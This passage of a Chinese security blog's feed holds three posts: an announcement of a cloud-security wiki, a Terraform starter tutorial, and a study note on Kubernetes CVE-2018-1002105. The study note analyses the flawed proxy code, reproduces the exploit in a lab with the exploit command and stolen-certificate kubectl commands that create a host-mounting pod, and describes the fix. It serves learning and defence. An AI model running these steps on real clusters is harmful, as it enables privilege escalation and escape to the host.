    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>T Wiki</code> 是一个面向云安全方向的知识库，这一点是和其他文库最大的不同，也许这是国内第一个云安全知识文库？</p><p>搭建这个文库的起因是笔者发现在云安全方向的中文资料属实不多，少有的这些资料也很散乱，于是搭建了这个文库。</p><p>文库的地址为：<a href="https://wiki.teamssix.com/">wiki.teamssix.com</a></p><h2 id="文库介绍"><a href="#文库介绍" class="headerlink" title="文库介绍"></a>文库介绍</h2><p>首先来看文库首页，文库主要分成了三个板块，分别为<code>云服务</code>、<code>云原生</code>、<code>云安全资源</code></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152146075.png"></p><p>首先来看<code>云安全资源</code>板块，这个板块是我个人觉着整个知识库较为与众不同的地方，在这里可以看到汇总的云安全资源，比如云安全相关的文章、公众号、工具、靶场等等。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152146469.png"></p><p>这部分的内容我也同步到了 Github 上单独作为一个项目，项目名称叫做 awesome-cloud-security，项目地址为：<a href="https://github.com/teamssix/awesome-cloud-security">https://github.com/teamssix/awesome-cloud-security</a></p><p>如果你知道一些比较好的云安全资源，欢迎留言补充，我会更新到这个板块中，首页的贡献者处也将出现你的身影。</p><p>在<code>云服务</code>板块可以看到云服务方向的文章、笔记</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152147429.png"></p><p>在<code>云原生</code>板块可以看到云原生方向的文章、笔记</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152147002.png"></p><p>目前文库的东西不算多，不过未来会不断更新，如果想要投稿，那么在<code>关于文库</code>中可以找到投稿的方式。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>相信通过这些资料能够在一定程度上帮助想要学习或者正在学习云安全的人，同时也欢迎读者一起来完善这个文库，从而帮助到更多的人，一起助力国内云安全的发展。</p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;T Wiki&lt;/code&gt; 是一个面向云安全方向的知识库，这一点是和其他文库最大的不同，也许这是国内第一个云安全知识文库？&lt;/p</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="知识文库" scheme="https://www.teamssix.com/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>【云原生】Terraform 初体验</title>
    <link href="https://www.teamssix.com/220408-145622.html"/>
    <id>https://www.teamssix.com/220408-145622.html</id>
    <published>2022-04-08T06:56:22.000Z</published>
    <updated>2022-04-08T08:46:38.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Terraform 是一种安全有效地构建、更改和版本控制基础设施的工具(基础架构自动化的编排工具)。</p><p>简单的说就是可以通过编写一些类似于 JSON 格式的文件，直接创建一批云上的服务资源，Terraform 和  AWS 的 CloudFormation 产品有些类似，但 CloudFormation 只支持 AWS，于是 HashiCorp 公司打造了一个多云 (Multi Cloud) 的开源的基础设施即代码 (IaC) 工具，即 Terraform</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>Terraform 的安装很简单，不同操作系统的安装命令如下：</p><ul><li>Ubuntu</li></ul><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;apt.releases.hashicorp.com&#x2F;gpg | sudo apt-key add -sudo apt-add-repository -y &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;apt.releases.hashicorp.com $(lsb_release -cs) main&quot;sudo apt-get update &amp;&amp; sudo apt-get install -y terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Centos</li></ul><pre class="line-numbers language-none"><code class="language-none">sudo yum install -y yum-utilssudo yum-config-manager --add-repo https:&#x2F;&#x2F;rpm.releases.hashicorp.com&#x2F;RHEL&#x2F;hashicorp.reposudo yum -y install terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Mac</li></ul><pre class="line-numbers language-none"><code class="language-none">brew tap hashicorp&#x2F;tapbrew install hashicorp&#x2F;tap&#x2F;terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-none"><code class="language-none">choco install terraform<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接到 Terraform 官网下载可执行文件使用，官方下载地址：<a href="https://www.terraform.io/downloads">https://www.terraform.io/downloads</a></p><h1 id="0x02-初体验"><a href="#0x02-初体验" class="headerlink" title="0x02 初体验"></a>0x02 初体验</h1><p>在使用 Terraform 之前，需要先在对应的云厂商控制台上生成一个 Access Key，这里以在 AWS 上创建一个 S3 服务为例。</p><p>首先新建一个文件夹，例如 demo 文件夹，接着在里面创建一个 s3demo.tf 文件，文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">provider &quot;aws&quot; &#123;  region     &#x3D; &quot;us-west-1&quot;  access_key &#x3D; &quot;your-access-key&quot;  secret_key &#x3D; &quot;your-secret-key&quot;&#125;resource &quot;aws_s3_bucket&quot; &quot;b&quot; &#123;  bucket &#x3D; &quot;my-tf-test-bucket-asdqqsdasd&quot;  tags &#x3D; &#123;    Name        &#x3D; &quot;My bucket&quot;    Environment &#x3D; &quot;Dev&quot;  &#125;&#125;resource &quot;aws_s3_bucket_acl&quot; &quot;example&quot; &#123;  bucket &#x3D; aws_s3_bucket.b.id  acl    &#x3D; &quot;private&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tf 文件采用的是 HCL 格式，HCL 格式是 Terraform 所属公司 HashiCorp 自己设计的一套配置语言</p><p>在 demo 文件夹下，运行一下初始化命令，这时 Terraform 会通过官方插件仓库下载对应的 Provider 插件</p><pre class="line-numbers language-none"><code class="language-none">terraform init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081514038.png"></p><p>因为我们这里的 s3demo.tf 里的 Provider 是 AWS，所以在初始化时，Terraform 就会去下载 AWS 的 Provider 插件</p><p>在 <a href="https://registry.terraform.io/browse/providers">https://registry.terraform.io/browse/providers</a> 可以看到 Terraform 所支持的厂商，这里基本上是涵盖了大部分云厂商的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081515182.png"></p><p>接着使用 plan 命令查看接下来将要产生的变更</p><pre class="line-numbers language-none"><code class="language-none">terraform plan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081515816.png"></p><p>如果没什么问题，就可以应用了</p><pre class="line-numbers language-none"><code class="language-none">terraform apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081516114.png"></p><p>中途会提示确认，输入 yes 即可</p><p>在 Terraform 执行完之后，查看 AWS 下的 S3 就可以看到刚刚通过 Terraform 创建的资源了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081516221.png"></p><p>这样就完成了使用 Terraform 部署云资源的一个过程，想要清理刚刚创建的资源也非常简单，直接 destroy 即可</p><pre class="line-numbers language-none"><code class="language-none">terraform destroy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081517821.png"></p><h1 id="0x03-一些有意思的"><a href="#0x03-一些有意思的" class="headerlink" title="0x03 一些有意思的"></a>0x03 一些有意思的</h1><h2 id="1、启动插件缓存"><a href="#1、启动插件缓存" class="headerlink" title="1、启动插件缓存"></a>1、启动插件缓存</h2><p>在刚刚进行 init 初始化时，Terraform 会根据 tf 文件内的 Provider 下载对应的插件，这些插件往往体积比较大，例如上面初始化时下载的 AWS Provider 体积就有两百多 M，如果不启用插件缓存，那么在每个 Terraform 项目中都会反复下载这些插件，就很浪费磁盘空间与流量，因此建议将插件缓存开启。</p><p>Windows 下是在相关用户的 %APPDATA% 目录下创建名为 “terraform.rc” 的文件，Macos 和 Linux 用户则是在用户的 home 下创建名为 “.terraformrc” 的文件</p><p>.terraformrc 文件内容为：</p><pre class="line-numbers language-none"><code class="language-none">plugin_cache_dir &#x3D; &quot;$HOME&#x2F;.terraform.d&#x2F;plugin-cache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样每次下载 Provider 插件时，就会下载到 “$HOME/.terraform.d/plugin-cache” 目录下了，不过 Terraform 不会主动清理这个文件夹，因此可能随着插件版本的更迭，这个文件夹内会保存一些历史版本的 Provider 插件，这时就需要自己手动清理一下了。</p><h2 id="2、可视化-Terraform"><a href="#2、可视化-Terraform" class="headerlink" title="2、可视化 Terraform"></a>2、可视化 Terraform</h2><p>如果 Terraform 项目比较复杂，那么可以利用 tfviz 这个工具，可视化 Terraform 项目，tfviz 项目地址：<a href="https://github.com/steeve85/tfviz">https://github.com/steeve85/tfviz</a></p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">GO111MODULE&#x3D;on go get -u github.com&#x2F;steeve85&#x2F;tfviz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到 Terraform 项目目录下使用</p><pre class="line-numbers language-none"><code class="language-none">tfviz -input .&#x2F; -output tfimg.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081517920.png"></p><h2 id="3、Terraform-代码安全性检查"><a href="#3、Terraform-代码安全性检查" class="headerlink" title="3、Terraform 代码安全性检查"></a>3、Terraform 代码安全性检查</h2><p>如果想知道自己写的 Terraform 项目代码有没有什么安全风险，那么可以使用 tfsec 这个工具，tfsec 项目地址：<a href="https://github.com/aquasecurity/tfsec">https://github.com/aquasecurity/tfsec</a></p><p>Mac 可以直接使用 brew 安装</p><pre class="line-numbers language-none"><code class="language-none">brew install tfsec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 go install 安装</p><pre class="line-numbers language-none"><code class="language-none">go install github.com&#x2F;aquasecurity&#x2F;tfsec&#x2F;cmd&#x2F;tfsec@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用也非常简单，直接来到 Terraform 项目目录下，使用 tfsec . 命令即可</p><pre class="line-numbers language-none"><code class="language-none">tfsec .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081518327.png"></p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p><p> 参考文章：</p><p> <a href="https://www.cnblogs.com/sparkdev/p/10052310.html">https://www.cnblogs.com/sparkdev/p/10052310.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Terraform 是一种安全有效地构建、更改和版本控制基础设施的工具(基础架构自动化的编排工具)。</summary>
      
    
    
    
    <category term="云原生" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    
    <category term="Terraform" scheme="https://www.teamssix.com/tags/Terraform/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】04 k8s 提权漏洞 CVE-2018-1002105 学习</title>
    <link href="https://www.teamssix.com/220324-161756.html"/>
    <id>https://www.teamssix.com/220324-161756.html</id>
    <published>2022-03-24T08:17:56.000Z</published>
    <updated>2022-03-24T09:11:31.538Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CVE-2018-1002105 是一个 k8s 提权漏洞，该漏洞允许攻击者在拥有 pod 权限的情况下，提升至 API Server 权限，当拥有  API Server 权限后，也就不难逃逸到宿主机了。</p><p>该漏洞的 CVSS 3.x 评分为 9.8 分，受影响版本如下：</p><p>Kubernetes v1.0.x-1.9.x<br>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)<br>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)<br>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</p><p>在开始学习该漏洞之前，需要先了解一下 WebSocket，WebSocket 是一种网络传输协议，位于 OSI 模型的应用层，和 HTTP 协议一样依赖于传输层的 TCP 协议。</p><p>为了实现和 HTTP 的兼容性，WebSocket 握手使用 HTTP 的 Upgrade 头，即表示从 HTTP 协议改成 WebSocket 协议，以下是一个简单的 WebSocket 握手请求。</p><p>客户端请求：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">GET /chat HTTP/1.1<span class="token key atrule">Host</span><span class="token punctuation">:</span> server.example.com<span class="token key atrule">Upgrade</span><span class="token punctuation">:</span> websocket<span class="token key atrule">Connection</span><span class="token punctuation">:</span> Upgrade<span class="token key atrule">Sec-WebSocket-Key</span><span class="token punctuation">:</span> dGhlIHNhbXBsZSBub25jZQ==<span class="token key atrule">Origin</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//example.com<span class="token key atrule">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> chat<span class="token punctuation">,</span> superchat<span class="token key atrule">Sec-WebSocket-Version</span><span class="token punctuation">:</span> <span class="token number">13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端响应：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">HTTP/1.1 101 Switching Protocols<span class="token key atrule">Upgrade</span><span class="token punctuation">:</span> websocket<span class="token key atrule">Connection</span><span class="token punctuation">:</span> Upgrade<span class="token key atrule">Sec-WebSocket-Accept</span><span class="token punctuation">:</span> s3pPLMBiTxaQ9kYGzzhZRbK+xOo=<span class="token key atrule">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> chat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在客户端的请求中，<code>Connection: Upgrade</code> 表示客户端希望升级协议，<code>Upgrade: WebSocket</code> 表示希望升级到 WebSocket 协议。</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h1><p>这里以 k8s v1.11.1 版本为例，代码地址：<a href="https://github.com/kubernetes/kubernetes/archive/refs/tags/v1.11.1.tar.gz">https://github.com/kubernetes/kubernetes/archive/refs/tags/v1.11.1.tar.gz</a></p><p>在进行漏洞分析之前，可以先通过下图去了解一下客户端向 pod 执行命令的流程</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241621405.png"></p><p>通过这张图不难看出，当客户端向 Node 节点里的 Pod 发送指令时，会先经过 API Server，再到 Kubelet，CVE-2018-1002105 漏洞也是存在于这个流程中，下面先来看看 API Server 的代码，再看看 Kubelet 的代码。</p><h2 id="API-Server-代码分析"><a href="#API-Server-代码分析" class="headerlink" title="API Server 代码分析"></a>API Server 代码分析</h2><p>先找到 staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go 文件，upgradeaware.go 用来处理 API Server 的代理逻辑，在 upgradeaware.go 的 185 行有个 ServerHTTP 函数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241622143.png"></p><p>在 187 行可以看到，ServerHTTP 函数调用了 tryUpgrade 函数，漏洞就存在于这个函数中，该函数位于 upgradeaware.go 的第 236行，下面就来分析一下这个函数。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241623296.png"></p><p>在  tryUpgrade 函数中，首先调用了 IsUpgradeRequest 函数</p><p>IsUpgradeRequest 函数会判断 HTTP 的请求包中是否存在<code>Connection: Upgrade</code>，即判断该请求是否想要升级，如果存在就会返回 True</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241623261.png"></p><p>接着回到刚才的 tryUpgrade 函数，在 tryUpgrade函数判断协议需要升级之后，建立了与后端服务器的连接</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241624195.png"></p><p>接着 tryUpgrade 函数进行了 HTTP Hijack 操作，简单的说，就是这里程序没有将 HTTP 连接交给 Go 内置的处理流程，而是自己在 TCP 的基础上进行了 HTTP 交互，这是从 HTTP 升级到 WebSocket 的关键步骤之一</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241624858.png"></p><p>然后 tryUpgrade 函数将后端针对上一次的请求响应返回给客户端</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241625276.png"></p><p> 然后使用 Goroutine 将客户端和后端服务的代理通道建立了起来</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241626310.png"></p><p>这里是 API Server 代码中的流程，下面来看看 kubelet 的流程。</p><h2 id="Kubelet-分析"><a href="#Kubelet-分析" class="headerlink" title="Kubelet 分析"></a>Kubelet 分析</h2><p>Kubelet 代码位置在 pkg/kubelet/server/server.go</p><p>在 server.go 中可以发现 Kubelet 启动时，会注册一系列的 API，/exec 也在其中，这里会主要看下 /exec 的代码</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241625425.png"></p><p>在 server.go 的第 671 行，可以看到 getExec 函数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241627573.png"></p><p>在该函数的第 673 行，首先创建了一个 Options 实例，这里看下其中的 NewOptions 函数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241627475.png"></p><p>在第 61 行可以看到如果请求中没有给出 stdin、stdout 和 stderr 这三个参数，这个 Options 实例将创建失败，err 参数将返回<code>you must specify at least 1 of stdin, stdout, stderr</code></p><p>这时 getExec 函数第 674 行的 if 判断将为真，此时 getExec 函数将直接返回客户端 http.StatusBadRequest 即状态码 400</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628491.png"></p><p>这时，可以构造一下请求测试一下，可以看到确实返回了 400，和分析结果一致。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628793.png"></p><p>结合 API Server 的 tryUpgrade 函数代码可以发现，API Server 并没有对这种错误情况进行处理，也就是说在 API Server 中并没有对请求的返回值进行判断，不管返回值是多少都会走到下面的 Goroutine 代码中，依旧为 Kubelet 建立 WebSocket 连接。</p><p>而且因为 getExec 报错失败了，所以这种连接也没有对接到某个 Pod 上，连接也没有被销毁，客户端可以继续通过这个连接向 Kubelet 发送指令。</p><p>由于经过了 API Server 的代理，因此指令是以 API Server 的权限向 Kubelet 下发的，也就是说客户端能自由的向该 Kubelet 下发指令，而不受限制，从而实现了权限提升。</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先需要安装低版本的 k8s，这里版本为 1.11.1</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">git clone https<span class="token punctuation">:</span>//github.com/brant<span class="token punctuation">-</span>ruan/metarget.gitcd metarget/pip3 install <span class="token punctuation">-</span>r requirements.txt./metarget cnv install cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span><span class="token number">1002105</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着需要准备一些文件，文件地址：<a href="https://github.com/Metarget/cloud-native-security-book/tree/main/code/0403-CVE-2018-1002105">https://github.com/Metarget/cloud-native-security-book/tree/main/code/0403-CVE-2018-1002105</a></p><p>下载这些文件后，创建相应资源</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_namespace.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_role.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_rolebinding.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_pod.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>配置用户认证</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">cp test<span class="token punctuation">-</span>token.csv /etc/kubernetes/pki/test<span class="token punctuation">-</span>role<span class="token punctuation">-</span>token.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 API Server 的配置文件 /etc/kubernetes/manifests/kube-apiserver.yaml 中容器的启动参数部分末尾（spec.container.command）增加一行配置</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">-</span><span class="token punctuation">-</span>token<span class="token punctuation">-</span>auth<span class="token punctuation">-</span>file=/etc/kubernetes/pki/test<span class="token punctuation">-</span>role<span class="token punctuation">-</span>token.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待 API Server 重启，此时场景就搭建完毕了，下面测试下，场景是否正常</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>token=password <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>insecure<span class="token punctuation">-</span>skip<span class="token punctuation">-</span>tls<span class="token punctuation">-</span>verify exec <span class="token punctuation">-</span>it test <span class="token punctuation">-</span>n test /bin/hostnamekubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>token=password <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>insecure<span class="token punctuation">-</span>skip<span class="token punctuation">-</span>tls<span class="token punctuation">-</span>verify get pods <span class="token punctuation">-</span>n kube<span class="token punctuation">-</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结果显示能够对指定 Pod 执行命令，但是不能执行其他越权操作，符合预期场景。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628124.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用脚本获得高权限凭证文件，脚本地址：<a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</a></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">python3 exploit.py <span class="token punctuation">-</span><span class="token punctuation">-</span>target 172.16.214.18 <span class="token punctuation">-</span><span class="token punctuation">-</span>port 6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>bearer<span class="token punctuation">-</span>token password <span class="token punctuation">-</span><span class="token punctuation">-</span>namespace test <span class="token punctuation">-</span><span class="token punctuation">-</span>pod test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628455.png"></p><p>接着，使用拿到的高权限凭证在集群中新建一个挂载了宿主机根目录的 Pod，yaml 文件地址：<a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/attacker.yaml">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/attacker.yaml</a></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>certificate<span class="token punctuation">-</span>authority=./ca.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>certificate=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>key=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.key apply <span class="token punctuation">-</span>f attacker.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Pod 被成功创建后，执行 ls /host-escape-door 命令可成功看到宿主机下的文件。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>certificate<span class="token punctuation">-</span>authority=./ca.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>certificate=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>key=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.key exec attacker ls /host<span class="token punctuation">-</span>escape<span class="token punctuation">-</span>door<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241629440.png"></p><p>至此，完成了 CVE-2018-1002015 漏洞的复现。</p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>该漏洞的修复也比较简单，直接在 API Server 中增加对后端服务器返回值的判断即可。</p><p>在新版 k8s 中的 tryUpgrade 函数这里，会判断状态码是否等于 http.StatusSwitchingProtocols，即 101，如果状态码不等于 101，则关闭连接。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241629620.png"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考资料：</p><p>《云原生安全-攻防实践与体系构建》</p><p><a href="https://xz.aliyun.com/t/3542">https://xz.aliyun.com/t/3542</a></p><p><a href="https://zh.wikipedia.org/wiki/WebSocket">https://zh.wikipedia.org/wiki/WebSocket</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="k8s" scheme="https://www.teamssix.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】k8s 所面临的风险学习</title>
    <link href="https://www.teamssix.com/220321-185825.html"/>
    <id>https://www.teamssix.com/220321-185825.html</id>
    <published>2022-03-21T10:58:25.000Z</published>
    <updated>2022-03-21T11:11:51.911Z</updated>
    
